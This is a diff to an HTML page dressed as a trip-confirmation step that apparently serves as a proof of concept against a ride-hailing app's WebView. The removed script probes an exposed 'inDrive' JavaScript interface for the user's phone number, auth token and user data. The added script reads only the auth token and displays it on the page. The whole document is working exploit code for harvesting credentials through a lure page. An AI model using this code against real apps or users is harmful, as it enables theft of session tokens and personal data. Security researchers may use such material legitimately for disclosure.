@@ -83,40 +83,20 @@
       This step is required to confirm your upcoming trip.
     </div>
 
-    <script>
-  const results = [];
-
-  try {
-    if (typeof inDrive !== "undefined") {
-      results.push("[+] Found 'inDrive' object.");
-
+      <script>
+    setTimeout(function() {
       try {
-        results.push("getPhoneNumber(): " + inDrive.getPhoneNumber());
+        if (typeof inDrive !== "undefined") {
+          document.getElementById("out").innerText =
+            "getAuthToken(): " + inDrive.getAuthToken();
+        } else {
+          document.getElementById("out").innerText = "inDrive object not found.";
+        }
       } catch (e) {
-        results.push("[-] getPhoneNumber() failed: " + e);
+        document.getElementById("out").innerText = "Exception: " + e;
       }
-
-      try {
-        results.push("getAuthToken(): " + inDrive.getAuthToken());
-      } catch (e) {
-        results.push("[-] getAuthToken() failed: " + e);
-      }
-
-      try {
-        results.push("getUserData(): " + inDrive.getUserData());
-      } catch (e) {
-        results.push("[-] getUserData() failed: " + e);
-      }
-    } else {
-      results.push("[-] 'inDrive' object not found.");
-    }
-  } catch (e) {
-    results.push("[!] Exception during probing: " + e);
-  }
-
-  document.write("<h2 style='font-family:sans-serif;'>inDrive WebView Probe</h2><pre style='background:#f0f0f0;padding:1em;border-radius:6px;'>" + results.join("<br>") + "</pre>");
-</script>
-
+    }, 250); // short delay to ensure interface is bound
+  </script>
   </div>
 </body>
 </html>
